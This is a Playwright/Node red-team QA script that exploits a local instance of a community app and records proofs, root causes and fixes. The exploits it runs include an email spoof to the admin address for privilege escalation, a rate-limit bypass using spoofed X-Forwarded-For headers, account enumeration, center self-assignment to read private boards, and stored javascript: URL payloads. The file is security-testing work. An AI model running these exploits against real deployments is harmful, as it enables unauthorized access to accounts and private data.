import { chromium } from '@playwright/test'
import { execFileSync } from 'node:child_process'
import { mkdir, writeFile } from 'node:fs/promises'
import { resolve } from 'node:path'

const repoRoot = resolve(new URL('../..', import.meta.url).pathname)
const outDir = resolve(new URL('.', import.meta.url).pathname)
const API = 'http://127.0.0.1:8787/api'
const WEB = 'http://localhost:8081'
const password = process.env.QA_PASSWORD || 'PreviewTest2026!'
const qaCode = 'QA-TEST'
const adminEmail = 'chinmayajanata@gmail.com'

const findings = []
const screenshots = []

function sql(command) {
  execFileSync(
    'npx',
    [
      'wrangler',
      'd1',
      'execute',
      'chinmaya-janata-db',
      '--local',
      '--config',
      'packages/backend/wrangler.toml',
      '--command',
      command,
    ],
    { cwd: repoRoot, stdio: 'pipe' },
  )
}

function sqlJson(command) {
  const raw = execFileSync(
    'npx',
    [
      'wrangler',
      'd1',
      'execute',
      'chinmaya-janata-db',
      '--local',
      '--config',
      'packages/backend/wrangler.toml',
      '--command',
      command,
      '--json',
    ],
    { cwd: repoRoot, stdio: 'pipe', encoding: 'utf8' },
  )
  return JSON.parse(raw)[0]?.results || []
}

async function api(path, options = {}) {
  let response
  let lastError
  for (let attempt = 0; attempt < 4; attempt += 1) {
    try {
      response = await fetch(`${API}${path}`, {
        ...options,
        headers: {
          ...(options.body && !(options.body instanceof FormData)
            ? { 'Content-Type': 'application/json' }
            : {}),
          Connection: 'close',
          ...(options.headers || {}),
        },
      })
      break
    } catch (error) {
      lastError = error
      await new Promise((resolveRetry) => setTimeout(resolveRetry, 250 * (attempt + 1)))
    }
  }
  if (!response) throw lastError
  const text = await response.text()
  let body = null
  try {
    body = text ? JSON.parse(text) : null
  } catch {
    body = { text }
  }
  return { status: response.status, ok: response.ok, body }
}

const auth = (token) => ({ Authorization: `Bearer ${token}` })

async function register(email, inviteCode = qaCode) {
  return api('/auth/register', {
    method: 'POST',
    headers: spoofIpHeaders(ipFor(email, 10)),
    body: JSON.stringify({ username: email, password, inviteCode }),
  })
}

async function login(email, loginPassword = password) {
  const result = await api('/auth/authenticate', {
    method: 'POST',
    headers: spoofIpHeaders(ipFor(email, 100)),
    body: JSON.stringify({ username: email, password: loginPassword }),
  })
  if (!result.body?.token) {
    throw new Error(`Login failed for ${email}: ${JSON.stringify(result)}`)
  }
  return result.body
}

function spoofIpHeaders(ip) {
  return { 'CF-Connecting-IP': ip, 'X-Forwarded-For': ip }
}

async function verify(token) {
  return api('/auth/verify', { headers: auth(token) })
}

function ipFor(value, base = 10) {
  let acc = 0
  for (const ch of String(value)) acc = (acc + ch.charCodeAt(0)) % 200
  return `10.${base}.${Math.floor(acc / 250)}.${20 + acc}`
}

function escapeSql(value) {
  return String(value).replaceAll("'", "''")
}

function escapeHtml(value) {
  return String(value)
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')
}

function redacted(value) {
  return JSON.stringify(value, null, 2)
    .replaceAll(/eyJ[a-zA-Z0-9._-]+/g, '[JWT_REDACTED]')
    .slice(0, 5000)
}

async function screenshotHtml(browser, filename, title, sections) {
  const html = `<!doctype html>
  <html>
    <head>
      <meta charset="utf-8" />
      <title>${escapeHtml(title)}</title>
      <style>
        body { font-family: Inter, system-ui, sans-serif; margin: 32px; color: #111827; background: #f8fafc; }
        h1 { font-size: 28px; margin: 0 0 8px; }
        .meta { color: #4b5563; margin-bottom: 24px; }
        section { background: #fff; border: 1px solid #d1d5db; border-radius: 8px; padding: 16px; margin-bottom: 16px; }
        h2 { font-size: 16px; margin: 0 0 10px; }
        pre { white-space: pre-wrap; overflow-wrap: anywhere; background: #111827; color: #f9fafb; padding: 14px; border-radius: 6px; font-size: 12px; line-height: 1.42; }
      </style>
    </head>
    <body>
      <h1>${escapeHtml(title)}</h1>
      <div class="meta">Local red-team proof. Tokens redacted. Generated ${new Date().toISOString()}.</div>
      ${sections
        .map(
          (section) => `<section><h2>${escapeHtml(section.heading)}</h2><pre>${escapeHtml(redacted(section.data))}</pre></section>`,
        )
        .join('')}
    </body>
  </html>`
  const page = await browser.newPage({ viewport: { width: 1440, height: 1100 } })
  await page.setContent(html, { waitUntil: 'domcontentloaded' })
  const path = `${outDir}/${filename}`
  await page.screenshot({ path, fullPage: true })
  await page.close()
  screenshots.push(path)
  return filename
}

function addFinding(finding) {
  findings.push(finding)
  if (!finding.confirmed) {
    throw new Error(`Expected confirmed finding failed: ${finding.id} ${finding.title}`)
  }
}

async function addProof(browser, finding, sections) {
  const screenshot = await screenshotHtml(browser, finding.screenshot, `${finding.id}: ${finding.title}`, sections)
  addFinding({ ...finding, screenshot })
}

async function resetAccounts(emails) {
  const list = emails.map((e) => `'${escapeSql(e.toLowerCase())}'`).join(',')
  if (!list) return
  sql(`DELETE FROM users WHERE lower(username) IN (${list}) OR lower(email) IN (${list});`)
}

async function ensureQaCode() {
  sql(
    `INSERT OR IGNORE INTO invite_codes (code, label, verification_level, is_active, max_uses)
     VALUES ('${qaCode}', 'Local deep red-team QA', 45, 1, NULL);`,
  )
}

async function registerMany(emails) {
  for (const email of emails) {
    await register(email)
  }
}

function getSeedCenters() {
  const centers = sqlJson('SELECT id, name FROM centers ORDER BY name LIMIT 6;')
  if (centers.length < 2) throw new Error('Need at least two local centers')
  return centers
}

function getUserId(email) {
  const row = sqlJson(`SELECT id FROM users WHERE username='${escapeSql(email.toLowerCase())}' LIMIT 1;`)[0]
  if (!row?.id) throw new Error(`Missing user ${email}`)
  return row.id
}

async function main() {
  await mkdir(outDir, { recursive: true })
  await api('/health')
  await ensureQaCode()

  const centers = getSeedCenters()
  const centerA = centers[0]
  const centerB = centers[1]
  const emails = {
    attacker: 'rt26.attacker@janata.local',
    memberA: 'rt26.membera@janata.local',
    memberB: 'rt26.memberb@janata.local',
    unverified: 'rt26.unverified@janata.local',
    sevak: 'rt26.sevak@janata.local',
    inactive: 'rt26.inactive@janata.local',
    admin: 'rt26.admin@janata.local',
    target: 'rt26.target@janata.local',
    duplicateOne: 'rt26.dup1@janata.local',
    duplicateTwo: 'rt26.dup2@janata.local',
    dev: 'sahanavasairamesh@gmail.com',
  }

  await resetAccounts(Object.values(emails))
  await registerMany([
    emails.attacker,
    emails.memberA,
    emails.memberB,
    emails.unverified,
    emails.sevak,
    emails.inactive,
    emails.admin,
    emails.target,
    emails.duplicateOne,
    emails.duplicateTwo,
  ])

  sql(`
    UPDATE users SET verification_level=45, is_verified=1, is_active=1, center_id='${escapeSql(centerA.id)}', first_name='Member', last_name='A', profile_complete=1 WHERE username='${emails.memberA}';
    UPDATE users SET verification_level=45, is_verified=1, is_active=1, center_id='${escapeSql(centerB.id)}', first_name='Member', last_name='B', profile_complete=1 WHERE username='${emails.memberB}';
    UPDATE users SET verification_level=30, is_verified=0, is_active=1, center_id=NULL, invite_code=NULL, email_verified_at=NULL, first_name='Unverified', last_name='QA', profile_complete=1 WHERE username='${emails.unverified}';
    UPDATE users SET verification_level=54, is_verified=1, is_active=1, center_id='${escapeSql(centerA.id)}', first_name='Sevak', last_name='QA', profile_complete=1 WHERE username='${emails.sevak}';
    UPDATE users SET verification_level=45, is_verified=1, is_active=0, center_id='${escapeSql(centerA.id)}', first_name='Inactive', last_name='QA', profile_complete=1 WHERE username='${emails.inactive}';
    UPDATE users SET verification_level=110, is_verified=1, is_active=1, center_id='${escapeSql(centerA.id)}', first_name='Admin', last_name='QA', profile_complete=1 WHERE username='${emails.admin}';
    UPDATE users SET verification_level=45, is_verified=1, is_active=1, center_id='${escapeSql(centerA.id)}', first_name='Target', last_name='QA', profile_complete=1 WHERE username='${emails.target}';
  `)

  const auths = {
    attacker: await login(emails.attacker),
    memberA: await login(emails.memberA),
    memberB: await login(emails.memberB),
    unverified: await login(emails.unverified),
    sevak: await login(emails.sevak),
    inactive: await login(emails.inactive),
    admin: await login(emails.admin),
    target: await login(emails.target),
  }

  const browser = await chromium.launch({ headless: true })

  try {
    // 1. Email spoof to admin.
    const beforeAdmin = await api('/admin/users?limit=2', { headers: auth(auths.attacker.token) })
    const emailSpoof = await api('/auth/update-profile', {
      method: 'PUT',
      headers: auth(auths.attacker.token),
      body: JSON.stringify({ email: adminEmail, firstName: 'EmailSpoofed' }),
    })
    const afterAdmin = await api('/admin/users?limit=2', { headers: auth(auths.attacker.token) })
    await addProof(browser, {
      id: 'RT-001',
      severity: 'Critical',
      cvss: '9.8',
      title: 'Mutable profile email grants admin access',
      confirmed: beforeAdmin.status === 403 && emailSpoof.status === 200 && afterAdmin.status === 200,
      affected: 'PUT /api/auth/update-profile, adminMiddleware',
      cwe: 'CWE-266 Incorrect Privilege Assignment',
      reproduction: [
        'Authenticate as any normal user.',
        'PUT /api/auth/update-profile with email set to chinmayajanata@gmail.com.',
        'Call any /api/admin/* endpoint with the same token.',
      ],
      rootCause: 'isAdmin trusts mutable users.email and update-profile lets users change it.',
      fix: 'Remove email-based admin checks or require verified immutable admin identity; block user-controlled email role changes.',
      screenshot: '01-email-spoof-admin.png',
    }, [
      { heading: 'Before exploit', data: beforeAdmin },
      { heading: 'Email update exploit', data: emailSpoof },
      { heading: 'After exploit', data: afterAdmin },
    ])

    const adminUiContext = await browser.newContext({ viewport: { width: 1440, height: 950 } })
    await adminUiContext.addInitScript(({ token, refreshToken }) => {
      localStorage.setItem('@auth_token', token)
      if (refreshToken) localStorage.setItem('@refresh_token', refreshToken)
    }, auths.attacker)
    const adminUiPage = await adminUiContext.newPage()
    await adminUiPage.goto(`${WEB}/admin`, { waitUntil: 'domcontentloaded' })
    await adminUiPage.waitForTimeout(3000)
    await adminUiPage.screenshot({ path: `${outDir}/02-email-spoof-admin-ui.png`, fullPage: false })
    screenshots.push(`${outDir}/02-email-spoof-admin-ui.png`)
    await adminUiContext.close()

    // 2. Developer email self-provision.
    await resetAccounts([emails.dev])
    const devRegister = await api('/auth/register', {
      method: 'POST',
      body: JSON.stringify({ username: emails.dev, password }),
    })
    const devAuth = await login(emails.dev)
    const devVerify = await verify(devAuth.token)
    const devAdmin = await api('/admin/users?limit=1', { headers: auth(devAuth.token) })
    await addProof(browser, {
      id: 'RT-002',
      severity: 'Critical',
      cvss: '9.1',
      title: 'Developer email bypass self-provisions admin-capable role',
      confirmed: devRegister.status === 201 && devVerify.body?.user?.verificationLevel >= 107 && devAdmin.status === 200,
      affected: 'POST /api/auth/register',
      cwe: 'CWE-287 Improper Authentication',
      reproduction: ['Register a listed developer email without an invite.', 'Log in.', 'Call /api/admin/users.'],
      rootCause: 'Public registration grants BRAHMACHARI based only on email string membership in DEVELOPER_EMAILS.',
      fix: 'Environment-gate or remove developer bypass; require email ownership and server-side provisioning.',
      screenshot: '03-developer-email-bypass.png',
    }, [
      { heading: 'Registration without invite', data: devRegister },
      { heading: 'Resulting role', data: devVerify },
      { heading: 'Admin endpoint access', data: devAdmin },
    ])

    // 3. Inactive user can still authenticate and use API.
    const inactiveVerify = await verify(auths.inactive.token)
    const inactiveFeed = await api('/feed', { headers: auth(auths.inactive.token) })
    await addProof(browser, {
      id: 'RT-003',
      severity: 'High',
      cvss: '7.5',
      title: 'Inactive accounts are not blocked by authentication middleware',
      confirmed: inactiveVerify.status === 200 && inactiveVerify.body?.user?.isActive === false && inactiveFeed.status === 200,
      affected: 'authMiddleware, POST /api/auth/authenticate',
      cwe: 'CWE-285 Improper Authorization',
      reproduction: ['Set a user is_active=0.', 'Authenticate as that user.', 'Use an authenticated endpoint.'],
      rootCause: 'authMiddleware checks token validity but never enforces users.is_active.',
      fix: 'Reject inactive users on login and every authenticated request.',
      screenshot: '04-inactive-user-auth.png',
    }, [
      { heading: 'Inactive user verifies successfully', data: inactiveVerify },
      { heading: 'Inactive user can read authenticated feed', data: inactiveFeed },
    ])

    // 4. Rate limit bypass by spoofing X-Forwarded-For.
    const sameIp = []
    for (let i = 0; i < 6; i += 1) {
      sameIp.push(await api('/auth/authenticate', {
        method: 'POST',
        headers: spoofIpHeaders('203.0.113.10'),
        body: JSON.stringify({ username: 'missing-rate-limit@janata.local', password: 'bad-password' }),
      }))
    }
    const variedIp = []
    for (let i = 0; i < 8; i += 1) {
      variedIp.push(await api('/auth/authenticate', {
        method: 'POST',
        headers: spoofIpHeaders(`203.0.113.${30 + i}`),
        body: JSON.stringify({ username: 'missing-rate-limit@janata.local', password: 'bad-password' }),
      }))
    }
    await addProof(browser, {
      id: 'RT-004',
      severity: 'High',
      cvss: '7.4',
      title: 'Authentication rate limits trust spoofable client IP headers',
      confirmed: sameIp.some((r) => r.status === 429) && variedIp.every((r) => r.status !== 429),
      affected: 'rateLimit middleware on auth endpoints',
      cwe: 'CWE-348 Use of Less Trusted Source',
      reproduction: ['Send failed login attempts with one X-Forwarded-For value.', 'Repeat with a new X-Forwarded-For value per request.'],
      rootCause: 'rateLimit accepts CF-Connecting-IP/X-Forwarded-For request headers directly.',
      fix: 'Use trusted platform client IP metadata only; strip/ignore client-supplied forwarding headers.',
      screenshot: '05-rate-limit-bypass.png',
    }, [
      { heading: 'Same spoofed IP hits 429', data: sameIp.map((r) => r.status) },
      { heading: 'Varied spoofed IP bypasses limiter', data: variedIp.map((r) => r.status) },
    ])

    // 5. Public user enumeration.
    const enumKnown = await api('/userExistence', {
      method: 'POST',
      body: JSON.stringify({ username: emails.memberA }),
    })
    const enumUnknown = await api('/userExistence', {
      method: 'POST',
      body: JSON.stringify({ username: `missing-${Date.now()}@janata.local` }),
    })
    await addProof(browser, {
      id: 'RT-005',
      severity: 'Medium',
      cvss: '5.3',
      title: 'Unauthenticated user-existence endpoint enumerates accounts',
      confirmed: enumKnown.body?.existence === true && enumUnknown.body?.existence === false,
      affected: 'POST /api/userExistence',
      cwe: 'CWE-203 Observable Discrepancy',
      reproduction: ['POST a known username.', 'POST a random username.', 'Compare existence booleans.'],
      rootCause: 'Endpoint returns exact account existence without auth.',
      fix: 'Remove endpoint or normalize responses and move checks behind flow-specific throttling.',
      screenshot: '06-user-enumeration.png',
    }, [
      { heading: 'Known account', data: enumKnown },
      { heading: 'Unknown account', data: enumUnknown },
    ])

    // 6. Error detail leak.
    const malformed = await api('/auth/register', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: '{"username":',
    })
    await addProof(browser, {
      id: 'RT-006',
      severity: 'Low',
      cvss: '3.1',
      title: 'Internal exception messages are returned to clients',
      confirmed: malformed.status === 500 && /Unexpected end/.test(String(malformed.body?.error)),
      affected: 'global error handler',
      cwe: 'CWE-209 Information Exposure Through Error Message',
      reproduction: ['Send malformed JSON to /api/auth/register.', 'Observe internal parser message in response body.'],
      rootCause: 'app.onError returns errorMessage to the client.',
      fix: 'Return generic errors externally; log details server-side only.',
      screenshot: '07-error-detail-leak.png',
    }, [{ heading: 'Malformed JSON response', data: malformed }])

    // 7. Email can be set to duplicate/unverified value.
    const dupUpdate = await api('/auth/update-profile', {
      method: 'PUT',
      headers: auth(auths.memberA.token),
      body: JSON.stringify({ email: emails.target }),
    })
    const dupRows = sqlJson(`SELECT username, email FROM users WHERE lower(email)='${escapeSql(emails.target)}' ORDER BY username;`)
    await addProof(browser, {
      id: 'RT-007',
      severity: 'High',
      cvss: '7.1',
      title: 'Users can set arbitrary or duplicate email addresses without verification',
      confirmed: dupUpdate.status === 200 && dupRows.length >= 2,
      affected: 'PUT /api/auth/update-profile',
      cwe: 'CWE-287 Improper Authentication',
      reproduction: ['Authenticate as user A.', 'Set email to user B username/email.', 'Query users with that email.'],
      rootCause: 'email is mutable, unverified, and not unique.',
      fix: 'Use a verified email-change workflow and enforce unique verified email addresses.',
      screenshot: '08-duplicate-email.png',
    }, [
      { heading: 'Email update response', data: dupUpdate },
      { heading: 'Duplicate email rows', data: dupRows },
    ])

    // 8. Center self-assignment bypasses board access.
    const boardPost = await api(`/boards/center/${encodeURIComponent(centerB.id)}/posts`, {
      method: 'POST',
      headers: auth(auths.memberB.token),
      body: JSON.stringify({ body: 'Private center B board proof post' }),
    })
    const privatePostId = boardPost.body?.post?.id
    const beforeBoard = await api(`/boards/center/${encodeURIComponent(centerB.id)}`, {
      headers: auth(auths.unverified.token),
    })
    const assignCenter = await api('/auth/update-profile', {
      method: 'PUT',
      headers: auth(auths.unverified.token),
      body: JSON.stringify({ centerID: centerB.id }),
    })
    const afterBoard = await api(`/boards/center/${encodeURIComponent(centerB.id)}`, {
      headers: auth(auths.unverified.token),
    })
    await addProof(browser, {
      id: 'RT-008',
      severity: 'Critical',
      cvss: '9.0',
      title: 'Self-service centerID update grants access to private center boards',
      confirmed: beforeBoard.status === 403 && assignCenter.status === 200 && afterBoard.status === 200,
      affected: 'PUT /api/auth/update-profile, GET /api/boards/center/:id',
      cwe: 'CWE-639 Authorization Bypass Through User-Controlled Key',
      reproduction: ['Create/locate a center-board post in center B.', 'As user without center B access, GET board and see 403.', 'Set own centerID to center B.', 'GET board again and see posts.'],
      rootCause: 'Board access trusts mutable users.center_id.',
      fix: 'Make center membership server-controlled; require admin/sevak approval or membership table.',
      screenshot: '09-center-self-assignment-board-read.png',
    }, [
      { heading: 'Private post created by center B member', data: boardPost },
      { heading: 'Before center self-assignment', data: beforeBoard },
      { heading: 'Self-assignment response', data: assignCenter },
      { heading: 'After center self-assignment', data: afterBoard },
    ])

    // 9. Unverified center-board posting after self-assignment.
    const unverifiedCenterPost = await api(`/boards/center/${encodeURIComponent(centerB.id)}/posts`, {
      method: 'POST',
      headers: auth(auths.unverified.token),
      body: JSON.stringify({ body: 'Unverified self-assigned center post proof' }),
    })
    await addProof(browser, {
      id: 'RT-009',
      severity: 'High',
      cvss: '8.0',
      title: 'Unverified self-assigned users can post to center boards',
      confirmed: unverifiedCenterPost.status === 201,
      affected: 'POST /api/boards/center/:id/posts',
      cwe: 'CWE-862 Missing Authorization',
      reproduction: ['Use RT-008 to self-assign centerID.', 'POST to /api/boards/center/:id/posts as unverified account.'],
      rootCause: 'Posting gate checks only board access and suspension, not verified membership.',
      fix: 'Require verified membership and server-controlled center membership for board writes.',
      screenshot: '10-unverified-center-post.png',
    }, [{ heading: 'Unverified center post response', data: unverifiedCenterPost }])

    // 10. Unverified public feed post.
    const unverifiedPublicPost = await api('/feed/public', {
      method: 'POST',
      headers: auth(auths.unverified.token),
      body: JSON.stringify({ body: 'Unverified public feed proof post' }),
    })
    await addProof(browser, {
      id: 'RT-010',
      severity: 'High',
      cvss: '7.5',
      title: 'Unverified users can post to the signed-in public feed',
      confirmed: unverifiedPublicPost.status === 201,
      affected: 'POST /api/feed/public',
      cwe: 'CWE-862 Missing Authorization',
      reproduction: ['Authenticate as verificationLevel 30 user.', 'POST /api/feed/public.'],
      rootCause: 'Public feed posting does not require NORMAL_USER verification.',
      fix: 'Gate public feed writes to verified, active, unsuspended members.',
      screenshot: '11-unverified-public-feed-post.png',
    }, [{ heading: 'Unverified public feed post', data: unverifiedPublicPost }])

    // 11. Report inaccessible private post.
    const memberABoardRead = await api(`/boards/center/${encodeURIComponent(centerB.id)}`, {
      headers: auth(auths.memberA.token),
    })
    const crossReport = await api(`/boards/posts/${encodeURIComponent(privatePostId)}/report`, {
      method: 'POST',
      headers: auth(auths.memberA.token),
      body: JSON.stringify({ reason: 'Cross-board report proof' }),
    })
    await addProof(browser, {
      id: 'RT-011',
      severity: 'Medium',
      cvss: '6.4',
      title: 'Users can report posts from boards they cannot access',
      confirmed: memberABoardRead.status === 403 && crossReport.status === 201,
      affected: 'POST /api/boards/posts/:postId/report',
      cwe: 'CWE-862 Missing Authorization',
      reproduction: ['Get a post id from a center board the attacker cannot access.', 'Verify board read returns 403.', 'POST report for that post id and see 201.'],
      rootCause: 'Report route looks up the post but does not call verifyBoardAccess.',
      fix: 'Require the same read access for report submission.',
      screenshot: '12-cross-board-report.png',
    }, [
      { heading: 'Attacker cannot read board', data: memberABoardRead },
      { heading: 'Attacker can report hidden post', data: crossReport },
    ])

    // 12. Any authenticated user can create center.
    const centerCreate = await api('/addCenter', {
      method: 'POST',
      headers: auth(auths.memberA.token),
      body: JSON.stringify({
        centerName: `RT26 Rogue Center ${Date.now()}`,
        latitude: 37.3349,
        longitude: -121.8881,
        address: 'Local red-team proof only',
      }),
    })
    const rogueCenterId = centerCreate.body?.id
    const rogueCenterFetch = rogueCenterId
      ? await api('/fetchCenter', { method: 'POST', body: JSON.stringify({ centerID: rogueCenterId }) })
      : null
    await addProof(browser, {
      id: 'RT-012',
      severity: 'Medium',
      cvss: '6.5',
      title: 'Any authenticated user can create center records',
      confirmed: centerCreate.status === 200 && rogueCenterFetch?.status === 200,
      affected: 'POST /api/addCenter',
      cwe: 'CWE-862 Missing Authorization',
      reproduction: ['Authenticate as normal member.', 'POST /api/addCenter.', 'Fetch the created center publicly.'],
      rootCause: 'Center creation is authentication-only.',
      fix: 'Gate center creation to admins or store submissions in a moderation queue.',
      screenshot: '13-member-center-create.png',
    }, [
      { heading: 'Create center as member', data: centerCreate },
      { heading: 'Fetch created center', data: rogueCenterFetch },
    ])
    if (rogueCenterId) sql(`DELETE FROM centers WHERE id='${escapeSql(rogueCenterId)}';`)

    // 13. Null-owner event edit.
    const legacy = sqlJson("SELECT id, title FROM events WHERE created_by IS NULL LIMIT 1;")[0]
    const legacyTitle = legacy.title
    const legacyExploitTitle = `[RT26 proof] ${legacyTitle}`
    const legacyEdit = await api('/updateEvent', {
      method: 'POST',
      headers: auth(auths.memberA.token),
      body: JSON.stringify({ eventJSON: { id: legacy.id, title: legacyExploitTitle } }),
    })
    const legacyFetch = await api('/fetchEvent', { method: 'POST', body: JSON.stringify({ id: legacy.id }) })
    const legacyRestore = await api('/updateEvent', {
      method: 'POST',
      headers: auth(auths.memberA.token),
      body: JSON.stringify({ eventJSON: { id: legacy.id, title: legacyTitle } }),
    })
    await addProof(browser, {
      id: 'RT-013',
      severity: 'High',
      cvss: '8.1',
      title: 'Any member can edit legacy events with no creator',
      confirmed: legacyEdit.status === 200 && legacyFetch.body?.event?.title === legacyExploitTitle && legacyRestore.status === 200,
      affected: 'POST /api/updateEvent',
      cwe: 'CWE-862 Missing Authorization',
      reproduction: ['Find event with created_by NULL.', 'POST /api/updateEvent as normal member.', 'Fetch event and observe modified title.'],
      rootCause: 'isEditable explicitly allows existing.created_by === null.',
      fix: 'Backfill owners or require admin for null-owner events.',
      screenshot: '14-null-owner-event-edit.png',
    }, [
      { heading: 'Legacy event selected', data: legacy },
      { heading: 'Member edit response', data: legacyEdit },
      { heading: 'Fetched modified event', data: legacyFetch },
      { heading: 'Restore response', data: legacyRestore },
    ])

    // 14. Sevak can create official event for another center.
    const crossCenterEvent = await api('/addEvent', {
      method: 'POST',
      headers: auth(auths.sevak.token),
      body: JSON.stringify({
        title: 'RT26 Cross Center Official Event',
        description: 'Local proof',
        latitude: 40,
        longitude: -75,
        address: 'Cross-center proof',
        date: '2026-09-01',
        centerID: centerB.id,
        category: 91,
      }),
    })
    const crossCenterFetch = crossCenterEvent.body?.id
      ? await api('/fetchEvent', { method: 'POST', body: JSON.stringify({ id: crossCenterEvent.body.id }) })
      : null
    await addProof(browser, {
      id: 'RT-014',
      severity: 'High',
      cvss: '7.6',
      title: 'Sevaks can create official events for centers they do not belong to',
      confirmed: crossCenterEvent.status === 200 && crossCenterFetch?.body?.event?.centerID === centerB.id && crossCenterFetch?.body?.event?.isOfficial === true,
      affected: 'POST /api/addEvent',
      cwe: 'CWE-863 Incorrect Authorization',
      reproduction: ['Set sevak center to center A.', 'Create event with centerID for center B.', 'Fetch event and observe center B plus official badge flag.'],
      rootCause: 'Event creation checks role only, not center ownership/scope.',
      fix: 'Require sevak/admin scope over the target center.',
      screenshot: '15-cross-center-official-event.png',
    }, [
      { heading: 'Sevak center and target center', data: { sevakCenter: centerA, targetCenter: centerB } },
      { heading: 'Create event response', data: crossCenterEvent },
      { heading: 'Fetched event', data: crossCenterFetch },
    ])

    // 15. Event creation accepts javascript URLs.
    const jsUrl = "javascript:alert('rt26')"
    const jsEvent = await api('/addEvent', {
      method: 'POST',
      headers: auth(auths.sevak.token),
      body: JSON.stringify({
        title: 'RT26 JavaScript URL Event',
        description: 'Local proof',
        latitude: 37,
        longitude: -122,
        address: 'URL proof',
        date: '2026-09-02',
        centerID: centerA.id,
        category: 91,
        signupUrl: jsUrl,
        externalUrl: jsUrl,
      }),
    })
    const jsFetch = jsEvent.body?.id
      ? await api('/fetchEvent', { method: 'POST', body: JSON.stringify({ id: jsEvent.body.id }) })
      : null
    await addProof(browser, {
      id: 'RT-015',
      severity: 'High',
      cvss: '8.0',
      title: 'Event creation accepts javascript: URLs used by frontend open-link actions',
      confirmed: jsEvent.status === 200 && jsFetch?.body?.event?.signupUrl === jsUrl && jsFetch?.body?.event?.externalUrl === jsUrl,
      affected: 'POST /api/addEvent, event detail Linking.openURL',
      cwe: 'CWE-79 Improper Neutralization of Input During Web Page Generation',
      reproduction: ['Create event with signupUrl/externalUrl set to javascript:alert(...).', 'Fetch event and observe stored URL.'],
      rootCause: 'validate.url only checks string length; frontend opens stored URLs.',
      fix: 'Parse URLs and allow only https/http schemes, preferably https.',
      screenshot: '16-event-create-javascript-url.png',
    }, [
      { heading: 'Create event with javascript URL', data: jsEvent },
      { heading: 'Fetched stored URLs', data: jsFetch },
    ])

    // 16. Event update accepts javascript URL.
    const safeUpdateEventId = crossCenterEvent.body?.id
    const updateJs = await api('/updateEvent', {
      method: 'POST',
      headers: auth(auths.sevak.token),
      body: JSON.stringify({ eventJSON: { id: safeUpdateEventId, signupUrl: jsUrl, externalUrl: jsUrl } }),
    })
    const updateJsFetch = await api('/fetchEvent', { method: 'POST', body: JSON.stringify({ id: safeUpdateEventId }) })
    await addProof(browser, {
      id: 'RT-016',
      severity: 'High',
      cvss: '8.0',
      title: 'Event update accepts javascript: URLs even when create validation should apply',
      confirmed: updateJs.status === 200 && updateJsFetch.body?.event?.signupUrl === jsUrl,
      affected: 'POST /api/updateEvent',
      cwe: 'CWE-20 Improper Input Validation',
      reproduction: ['As event creator, POST /api/updateEvent with javascript: URL fields.', 'Fetch event and observe stored values.'],
      rootCause: 'updateEvent does not validate URL fields.',
      fix: 'Share strict event input schema between create and update.',
      screenshot: '17-event-update-javascript-url.png',
    }, [
      { heading: 'Update event with javascript URL', data: updateJs },
      { heading: 'Fetched event after update', data: updateJsFetch },
    ])

    // 17. Event update accepts impossible coordinates.
    const badCoordinates = await api('/updateEvent', {
      method: 'POST',
      headers: auth(auths.sevak.token),
      body: JSON.stringify({ eventJSON: { id: safeUpdateEventId, latitude: 999, longitude: -999 } }),
    })
    const badCoordinatesFetch = await api('/fetchEvent', { method: 'POST', body: JSON.stringify({ id: safeUpdateEventId }) })
    await addProof(browser, {
      id: 'RT-017',
      severity: 'Medium',
      cvss: '5.5',
      title: 'Event update accepts impossible latitude and longitude values',
      confirmed: badCoordinates.status === 200 && badCoordinatesFetch.body?.event?.latitude === 999 && badCoordinatesFetch.body?.event?.longitude === -999,
      affected: 'POST /api/updateEvent',
      cwe: 'CWE-20 Improper Input Validation',
      reproduction: ['As event creator, update latitude to 999 and longitude to -999.', 'Fetch event and observe stored invalid coordinates.'],
      rootCause: 'updateEvent parses coordinate values without range checks.',
      fix: 'Apply create-route coordinate validation to every update path.',
      screenshot: '18-event-update-bad-coordinates.png',
    }, [
      { heading: 'Update impossible coordinates', data: badCoordinates },
      { heading: 'Fetched event after update', data: badCoordinatesFetch },
    ])

    // 18. Creator keeps roster PII after downgrade.
    const rosterEvent = await api('/addEvent', {
      method: 'POST',
      headers: auth(auths.sevak.token),
      body: JSON.stringify({
        title: 'RT26 Roster Downgrade Event',
        description: 'Roster proof',
        latitude: 37,
        longitude: -122,
        address: 'Roster proof',
        date: '2026-09-03',
        centerID: centerA.id,
        category: 91,
      }),
    })
    const rosterEventId = rosterEvent.body?.id
    const guestRsvp = await api('/attendEventGuest', {
      method: 'POST',
      body: JSON.stringify({ eventID: rosterEventId, name: 'Guest PII', email: 'guest-pii@janata.local' }),
    })
    sql(`UPDATE users SET verification_level=45 WHERE username='${emails.sevak}';`)
    const downgradedRoster = await api(`/events/${encodeURIComponent(rosterEventId)}/roster`, {
      headers: auth(auths.sevak.token),
    })
    sql(`UPDATE users SET verification_level=54 WHERE username='${emails.sevak}';`)
    await addProof(browser, {
      id: 'RT-018',
      severity: 'Medium',
      cvss: '6.5',
      title: 'Downgraded event creators retain attendee roster PII access',
      confirmed: guestRsvp.status === 200 && downgradedRoster.status === 200 && downgradedRoster.body?.guests?.[0]?.email === 'guest-pii@janata.local',
      affected: 'GET /api/events/:id/roster',
      cwe: 'CWE-863 Incorrect Authorization',
      reproduction: ['Create event as sevak.', 'Guest RSVP with email.', 'Downgrade creator below sevak.', 'GET roster as downgraded creator.'],
      rootCause: 'Roster access checks created_by or admin only, not current coordinator role/scope.',
      fix: 'Require current event-management permission for roster access.',
      screenshot: '19-downgraded-creator-roster.png',
    }, [
      { heading: 'Event and guest RSVP', data: { rosterEvent, guestRsvp } },
      { heading: 'Roster after creator downgrade', data: downgradedRoster },
    ])

    // 19. Guest RSVP spam with spoofed IP.
    const spamSameIp = []
    for (let i = 0; i < 6; i += 1) {
      spamSameIp.push(await api('/attendEventGuest', {
        method: 'POST',
        headers: spoofIpHeaders('198.51.100.10'),
        body: JSON.stringify({ eventID: rosterEventId, name: `Same IP ${i}`, email: `same-${i}-${Date.now()}@janata.local` }),
      }))
    }
    const spamVariedIp = []
    for (let i = 0; i < 8; i += 1) {
      spamVariedIp.push(await api('/attendEventGuest', {
        method: 'POST',
        headers: spoofIpHeaders(`198.51.100.${30 + i}`),
        body: JSON.stringify({ eventID: rosterEventId, name: `Varied IP ${i}`, email: `varied-${i}-${Date.now()}@janata.local` }),
      }))
    }
